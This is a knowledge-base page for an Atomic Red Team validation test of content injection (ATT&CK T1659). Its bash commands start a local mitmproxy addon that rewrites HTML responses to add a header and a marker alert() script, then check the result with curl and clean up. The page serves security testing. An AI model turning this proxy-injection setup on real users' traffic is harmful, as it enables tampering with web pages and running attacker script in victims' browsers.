---
atomic_guid: "9b360eaf-c778-4f07-a6e7-895c4f01ac1c"
title: "MITM Proxy Injection"
framework: "atomic"
generated: "true"
attack_technique_id: "T1659"
attack_technique_name: "Content Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1659/T1659.yaml"
build_date: "2026-04-26 14:38:40"
executor: "bash"
aliases:
  - "9b360eaf-c778-4f07-a6e7-895c4f01ac1c"
  - "MITM Proxy Injection"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# MITM Proxy Injection

Start mitmdump and verify injected header and HTML content.

## Metadata

- Atomic GUID: 9b360eaf-c778-4f07-a6e7-895c4f01ac1c
- Technique: T1659: Content Injection
- Platforms: macos, linux
- Executor: bash
- Source Path: atomics/T1659/T1659.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1659-content_injection|T1659]]

## Dependencies

python3 must be installed

### Prerequisite Check

```text
command -v python3
```

### Get Prerequisite

```text
brew install python3 || (sudo apt-get update && sudo apt-get install -y python3) || sudo yum install -y python3
```

curl must be installed

### Prerequisite Check

```text
command -v curl
```

### Get Prerequisite

```text
brew install curl || (sudo apt-get update && sudo apt-get install -y curl) || sudo yum install -y curl
```

pipx must be installed

### Prerequisite Check

```text
pipx --version
```

### Get Prerequisite

```text
brew install pipx || (sudo apt-get update && sudo apt-get install -y pipx) || sudo yum install -y pipx
```

mitmproxy must be installed

### Prerequisite Check

```text
pipx list | grep mitmproxy
```

### Get Prerequisite

```text
pipx install mitmproxy || brew install mitmproxy
```

mitmdump must be running on port 8080

### Prerequisite Check

```text
lsof -i tcp:8080 | grep mitmdump
```

### Get Prerequisite

```text
printf "from mitmproxy import http\ndef response(flow: http.HTTPFlow):\n    if 'text/html' in flow.response.headers.get('content-type',''):\n        flow.response.headers['X-Atomic']='T1659'\n        flow.response.text = flow.response.text.replace('</body>', '<script>alert(\"Atomic T1659 Injection\")</script></body>')" > /tmp/atomic_t1659_inject.py
($HOME/.local/bin/mitmdump -s /tmp/atomic_t1659_inject.py -p 8080 > /tmp/atomic_t1659.log 2>&1 &)
sleep 5
lsof -i tcp:8080 | grep mitmdump || (cat /tmp/atomic_t1659.log; exit 1)
```

## Executor

- name: bash

### Command

```bash
curl -skI --proxy http://127.0.0.1:8080 http://example.com > /tmp/curl_out.txt
grep "X-Atomic" /tmp/curl_out.txt || (cat /tmp/curl_out.txt && exit 1)
curl -sk --proxy http://127.0.0.1:8080 http://example.com > /tmp/atomic_t1659_page.html
grep -q "Atomic T1659 Injection" /tmp/atomic_t1659_page.html || (head -20 /tmp/atomic_t1659_page.html; exit 1)
```

### Cleanup

```bash
rm -rf /tmp/atomic_t1659_inject.py
rm -rf /tmp/atomic_t1659.log
rm -rf /tmp/curl_out.txt
rm -rf /tmp/atomic_t1659_page.html
pkill -f mitmdump || true
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1659/T1659.yaml)
